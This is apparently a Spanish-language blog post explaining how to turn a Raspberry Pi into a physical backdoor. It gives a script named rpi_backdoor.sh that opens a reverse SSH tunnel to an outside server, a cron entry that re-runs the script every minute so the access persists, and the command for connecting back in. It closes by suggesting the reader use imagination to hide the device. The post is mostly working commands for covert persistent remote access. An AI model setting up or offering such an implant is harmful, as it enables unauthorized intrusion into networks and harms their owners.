---
layout: post
title: Raspberry Physical Backdoor
categories: RaspberryPi
---

Reverse SSH connection with Raspbian

# Reverse SSH
Estableceremos una conexion de SSH reversa desde la RPi a algun servidor para poder controlar la RPi. Esto se asemeja a una conexion reversa usando netcat, pero con la variante de que este estara cifrado y contara con contraseña. 

# Materiales

* Raspberry pi
* Servidor

# Configuracion llave publica/privada
Para no colocar el usuario y contraseña cada ves que tengamos que conectarnos desde la RPi al servidor generaremos una llave publica ssh desde Raspbian y la subiremos al servidor donde nos conectaremos mas tarde para controlar la Raspberry Pi

### generando llave en la RPi
```
ssh-keygen -b 2048 -t rsa -f /home/pi/.ssh/id_rsa -q -N ""
```

### subiendo la llave publica al servidor
```
scp .ssh/id_rsa.pub <user>@<serverhost>:.ssh/authorized_keys
```

# Automatizando conexion
Creamos un script (robado) llamado `rpi_backdoor.sh` que automatiza la conexion del ssh

``` bash
#!/bin/bash
createTunnel() {
  /usr/bin/ssh -N -R 2222:localhost:22 <user>@<serverhost>
  if [[ $? -eq 0 ]]; then
    echo Tunnel to jumpbox created successfully
  else
    echo An error occurred creating a tunnel to jumpbox. RC was $?
  fi
}
/bin/pidof ssh
if [[ $? -ne 0 ]]; then
  echo Creating new tunnel connection
  createTunnel
fi
```

Tenemos que hacer que conecte cada vez que inicie Raspbian, para eso usamos cron para que la conexion sea persistente.

```
sudo su
echo "*/1 * * * * ~/rpi_backdoor.sh > tunnel.log 2>&1" >> /var/spool/cron/crontabs/pi
```

# Conectando al backdoor
Teniendo ya todo configurado, reiniciamos la RPi y ya podremos conectarnos desde el server

```
ssh pi@localhost -p 2222
```

# Como esconderlo?
Usa la imaginacion ;)
